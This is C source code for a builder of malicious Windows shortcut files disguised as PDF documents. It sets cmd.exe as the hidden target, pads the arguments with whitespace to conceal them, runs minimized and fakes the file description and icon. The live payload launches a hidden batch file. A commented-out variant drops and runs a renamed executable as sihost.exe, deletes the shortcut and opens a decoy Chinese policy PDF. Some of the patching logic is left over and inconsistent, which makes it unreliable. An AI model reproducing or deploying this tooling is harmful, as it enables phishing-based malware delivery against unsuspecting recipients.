#include <stdio.h>
#include <windows.h>
#include <locale.h>

#pragma warning(disable : 4996)
#define _CRT_SECURE_NO_WARNINGS
#define INVALID_SET_FILE_POINTER 0xFFFFFFFF

#define HasName 0x00000004
#define HasArguments 0x00000020
#define HasIconLocation 0x00000040
#define IsUnicode 0x00000080
#define HasExpString 0x00000200
#define PreferEnvironmentPath 0x02000000

struct ShellLinkHeaderStruct
{
    DWORD dwHeaderSize;
    CLSID LinkCLSID;
    DWORD dwLinkFlags;
    DWORD dwFileAttributes;
    FILETIME CreationTime;
    FILETIME AccessTime;
    FILETIME WriteTime;
    DWORD dwFileSize;
    DWORD dwIconIndex;
    DWORD dwShowCommand;
    WORD wHotKey;
    WORD wReserved1;
    DWORD dwReserved2;
    DWORD dwReserved3;
};

struct EnvironmentVariableDataBlockStruct
{
    DWORD dwBlockSize;
    DWORD dwBlockSignature;
    char szTargetAnsi[MAX_PATH];
    wchar_t wszTargetUnicode[MAX_PATH];
};

//DWORD CreateLinkFile(char *pOutputLinkPath, char *pLinkIconPath, char *pLinkDescription, char *pCmdArgument)
DWORD CreateLinkFile(char *pOutputLinkPath, char *pLinkIconPath, char *pLinkDescription)
{
    HANDLE hLinkFile = NULL;
    HANDLE hExeFile = NULL;
    ShellLinkHeaderStruct ShellLinkHeader;
    EnvironmentVariableDataBlockStruct EnvironmentVariableDataBlock;
    DWORD dwBytesWritten = 0;
    WORD wLinkDescriptionLength = 0;
    wchar_t wszLinkDescription[512];
    WORD wCommandLineArgumentsLength = 0;
    wchar_t wszCommandLineArguments[8192];
    WORD wIconLocationLength = 0;
    wchar_t wszIconLocation[512];
    BYTE bExeDataBuffer[1024];
    DWORD dwBytesRead = 0;
    DWORD dwEndOfLinkPosition = 0;
    DWORD dwCommandLineArgsStartPosition = 0;
    wchar_t *pCmdLinePtr = NULL;
    wchar_t wszOverwriteSkipBytesValue[16];
    wchar_t wszOverwriteSearchLnkFileSizeValue[16];
    BYTE bXorEncryptValue = 0;
    DWORD dwTotalFileSize = 0;


    // create link file
    hLinkFile = CreateFile(pOutputLinkPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hLinkFile == INVALID_HANDLE_VALUE)
    {
        printf("Failed to create output file\n");
        return 1;
    }

    // initialise link header
    memset((void*)&ShellLinkHeader, 0, sizeof(ShellLinkHeader));
    ShellLinkHeader.dwHeaderSize = sizeof(ShellLinkHeader);
    CLSIDFromString(L"{00021401-0000-0000-C000-000000000046}", &ShellLinkHeader.LinkCLSID);
    ShellLinkHeader.dwLinkFlags = HasArguments | HasExpString | PreferEnvironmentPath | IsUnicode | HasName | HasIconLocation;
    ShellLinkHeader.dwFileAttributes = 0;
    ShellLinkHeader.CreationTime.dwHighDateTime = 0;
    ShellLinkHeader.CreationTime.dwLowDateTime = 0;
    ShellLinkHeader.AccessTime.dwHighDateTime = 0;
    ShellLinkHeader.AccessTime.dwLowDateTime = 0;
    ShellLinkHeader.WriteTime.dwHighDateTime = 0;
    ShellLinkHeader.WriteTime.dwLowDateTime = 0;
    ShellLinkHeader.dwFileSize = 0;
    ShellLinkHeader.dwIconIndex = 0;
    ShellLinkHeader.dwShowCommand = SW_SHOWMINNOACTIVE;
    ShellLinkHeader.wHotKey = 0;

    // write ShellLinkHeader
    if (WriteFile(hLinkFile, (void*)&ShellLinkHeader, sizeof(ShellLinkHeader), &dwBytesWritten, NULL) == 0)
    {
        // error
        CloseHandle(hLinkFile);
        return 1;
    }

    // set link description
    setlocale(LC_ALL, "");    
    memset(wszLinkDescription, 0, sizeof(wszLinkDescription));
    mbstowcs(wszLinkDescription, pLinkDescription, (sizeof(wszLinkDescription) / sizeof(wchar_t)) - 1);
    wLinkDescriptionLength = (WORD)wcslen(wszLinkDescription);
    setlocale(LC_ALL, "C");     //默认


    // write LinkDescriptionLength
    if (WriteFile(hLinkFile, (void*)&wLinkDescriptionLength, sizeof(WORD), &dwBytesWritten, NULL) == 0)
    {
        // error
        CloseHandle(hLinkFile);
        return 1;
    }

    // write LinkDescription
    if (WriteFile(hLinkFile, (void*)wszLinkDescription, wLinkDescriptionLength * sizeof(wchar_t), &dwBytesWritten, NULL) == 0)
    {
        // error
        CloseHandle(hLinkFile);
        return 1;
    }

    // set target command-line
    memset(wszCommandLineArguments, 0, sizeof(wszCommandLineArguments));

    //_snwprintf(wszCommandLineArguments, (sizeof(wszCommandLineArguments) / sizeof(wchar_t)) - 1, L"%256S /c (xcopy /h /y %%cd%%\\__MACOSX\\.DOCX\\wct366A.tmp %%temp%%\\ & attrib -s -a -h %%temp%%\\wct366A.tmp & rename %%temp%%\\wct366A.tmp sihost.exe & attrib -s -a -h %%cd%%\\__MACOSX\\.DOCX\\wct366A.tmp & start %%temp%%\\sihost.exe & del \"天桥区电子商务产业发展扶持奖励政策.pdf.lnk\" & del /F /A /Q \"%%cd%%\\__MACOSX\\.DOCX\\wct366A.tmp\" & copy \"%%cd%%\\__MACOSX\\.DOCX\\天桥区电子商务产业发展扶持奖励政策.pdf\" \"%%cd%%\\天桥区电子商务产业发展扶持奖励政策.pdf\" & start \"\" \"%%cd%%\\天桥区电子商务产业发展扶持奖励政策.pdf\" & del \"%%cd%%\\__MACOSX\\.DOCX\\天桥区电子商务产业发展扶持奖励政策.pdf\")", "", "");
    
    const wchar_t* pszFormat = L"%20s /c (%s)";
    //_snwprintf(wszCommandLineArguments, (sizeof(wszCommandLineArguments) / sizeof(wchar_t)) - 1, L"%256s /c (calc.exe)", "", "");
    
    _snwprintf(wszCommandLineArguments, (sizeof(wszCommandLineArguments) / sizeof(wchar_t)) - 1, L"%256s /c (\.\\.__MACOSX\\.DOCX\\1.bat)", "", "");

    /*
    setlocale(LC_ALL, "");     //设置本地默认Locale. 或者是setlocale(LC_ALL, "chs")
    size_t CmdArgLen = mbstowcs(NULL, pCmdArgument, 0);
    wchar_t *pszCmdArg = new wchar_t[CmdArgLen+1];
    mbstowcs(pszCmdArg, pCmdArgument, CmdArgLen + 1);


    _snwprintf(wszCommandLineArguments, (sizeof(wszCommandLineArguments) / sizeof(wchar_t)) - 1, pszFormat, "", pszCmdArg);
    */

    wCommandLineArgumentsLength = (WORD)wcslen(wszCommandLineArguments);

    // write CommandLineArgumentsLength
    if (WriteFile(hLinkFile, (void*)&wCommandLineArgumentsLength, sizeof(WORD), &dwBytesWritten, NULL) == 0)
    {
        // error
        CloseHandle(hLinkFile);
        return 1;
    }

    // store start of command-line arguments position
    dwCommandLineArgsStartPosition = GetFileSize(hLinkFile, NULL);

    // write CommandLineArguments
    if (WriteFile(hLinkFile, (void*)wszCommandLineArguments, wCommandLineArgumentsLength * sizeof(wchar_t), &dwBytesWritten, NULL) == 0)
    {
        // error
        CloseHandle(hLinkFile);

        return 1;
    }

    // set link icon path
    memset(wszIconLocation, 0, sizeof(wszIconLocation));
    mbstowcs(wszIconLocation, pLinkIconPath, (sizeof(wszIconLocation) / sizeof(wchar_t)) - 1);
    wIconLocationLength = (WORD)wcslen(wszIconLocation);

    // write IconLocationLength
    if (WriteFile(hLinkFile, (void*)&wIconLocationLength, sizeof(WORD), &dwBytesWritten, NULL) == 0)
    {
        // error
        CloseHandle(hLinkFile);

        return 1;
    }

    // write IconLocation
    if (WriteFile(hLinkFile, (void*)wszIconLocation, wIconLocationLength * sizeof(wchar_t), &dwBytesWritten, NULL) == 0)
    {
        // error
        CloseHandle(hLinkFile);

        return 1;
    }

    // initialise environment variable data block
    memset((void*)&EnvironmentVariableDataBlock, 0, sizeof(EnvironmentVariableDataBlock));
    EnvironmentVariableDataBlock.dwBlockSize = sizeof(EnvironmentVariableDataBlock);
    EnvironmentVariableDataBlock.dwBlockSignature = 0xA0000001;
    strncpy(EnvironmentVariableDataBlock.szTargetAnsi, "%windir%\\system32\\cmd.exe", sizeof(EnvironmentVariableDataBlock.szTargetAnsi) - 1);
    mbstowcs(EnvironmentVariableDataBlock.wszTargetUnicode, EnvironmentVariableDataBlock.szTargetAnsi, (sizeof(EnvironmentVariableDataBlock.wszTargetUnicode) / sizeof(wchar_t)) - 1);

    // write EnvironmentVariableDataBlock
    if (WriteFile(hLinkFile, (void*)&EnvironmentVariableDataBlock, sizeof(EnvironmentVariableDataBlock), &dwBytesWritten, NULL) == 0)
    {
        // error
        CloseHandle(hLinkFile);

        return 1;
    }

    // store end of link data position
    dwEndOfLinkPosition = GetFileSize(hLinkFile, NULL);


    // store total file size
    dwTotalFileSize = GetFileSize(hLinkFile, NULL);

    // find the offset value of the number of bytes to skip in the command-line arguments
    pCmdLinePtr = wcsstr(wszCommandLineArguments, L"select -Skip 000000)");
    if (pCmdLinePtr == NULL)
    {
        // error
        CloseHandle(hLinkFile);

        return 1;
    }
    pCmdLinePtr += strlen("select -Skip ");

    // move the file pointer back to the "000000" value in the command-line arguments
    if (SetFilePointer(hLinkFile, dwCommandLineArgsStartPosition + (DWORD)((BYTE*)pCmdLinePtr - (BYTE*)wszCommandLineArguments), NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER)
    {
        // error
        CloseHandle(hLinkFile);

        return 1;
    }

    // overwrite link file size
    memset(wszOverwriteSkipBytesValue, 0, sizeof(wszOverwriteSkipBytesValue));
    _snwprintf(wszOverwriteSkipBytesValue, (sizeof(wszOverwriteSkipBytesValue) / sizeof(wchar_t)) - 1, L"%06u", dwEndOfLinkPosition);
    if (WriteFile(hLinkFile, (void*)wszOverwriteSkipBytesValue, wcslen(wszOverwriteSkipBytesValue) * sizeof(wchar_t), &dwBytesWritten, NULL) == 0)
    {
        // error
        CloseHandle(hLinkFile);

        return 1;
    }

    // find the offset value of the total lnk file length in the command-line arguments
    pCmdLinePtr = wcsstr(wszCommandLineArguments, L"_.length -eq 0x00000000}");
    if (pCmdLinePtr == NULL)
    {
        // error
        CloseHandle(hLinkFile);

        return 1;
    }
    pCmdLinePtr += strlen("_.length -eq ");

    // move the file pointer back to the "0x00000000" value in the command-line arguments
    if (SetFilePointer(hLinkFile, dwCommandLineArgsStartPosition + (DWORD)((BYTE*)pCmdLinePtr - (BYTE*)wszCommandLineArguments), NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER)
    {
        // error
        CloseHandle(hLinkFile);

        return 1;
    }

    // overwrite link file size
    memset(wszOverwriteSearchLnkFileSizeValue, 0, sizeof(wszOverwriteSearchLnkFileSizeValue));
    _snwprintf(wszOverwriteSearchLnkFileSizeValue, (sizeof(wszOverwriteSearchLnkFileSizeValue) / sizeof(wchar_t)) - 1, L"0x%08X", dwTotalFileSize);
    if (WriteFile(hLinkFile, (void*)wszOverwriteSearchLnkFileSizeValue, wcslen(wszOverwriteSearchLnkFileSizeValue) * sizeof(wchar_t), &dwBytesWritten, NULL) == 0)
    {
        // error
        CloseHandle(hLinkFile);

        return 1;
    }

    // close output file handle
    CloseHandle(hLinkFile);
    return 0;
}

void replaceNewline(char* str) {
    int i = 0;
    while (str[i] != '\0') {
        if (str[i] == '\\' && str[i + 1] == 'n') {
            str[i] = '\n';
            int j = i + 1;
            while (str[j] != '\0') {
                str[j] = str[j + 1];
                j++;
            }
        }
        i++;
    }
}


int main(int argc, char *argv[])
{
    char *pOutputLinkPath = NULL;
    char *CmdLineArgue = NULL;
    char *pDescription = NULL;
    
    // get params
    pOutputLinkPath = argv[1];
    pDescription = argv[2];

     if(argc !=3) {
        printf(" [+]Usage: %s  <output_lnk_path>  <description>  \n", argv[0]);
        printf(" e.g. : %s test.pdf.lnk \"类型:WPS PDF 文档\\n大小: 295 KB\\n修改时间: 2023/6/26 16:13\"  \n", argv[0]);
        printf(" lnk默认目标为当前路径下 .\\.__MACOSX\\.DOCX\\1.bat");
        return 1;
    }

     replaceNewline(pDescription);
    //if (CreateLinkFile(pOutputLinkPath, (char *)"%windir%\\system32\\notepad.exe", pDescription, CmdLineArgue) != 0)
    if (CreateLinkFile(pOutputLinkPath, (char *)"%windir%\\system32\\notepad.exe", pDescription) != 0)
    {
        printf("[+]Create Link File Success\n");
        return 1;
    }
    //名称 类型 大小 修改日期
    printf("Finished\n");
    return 0;
}
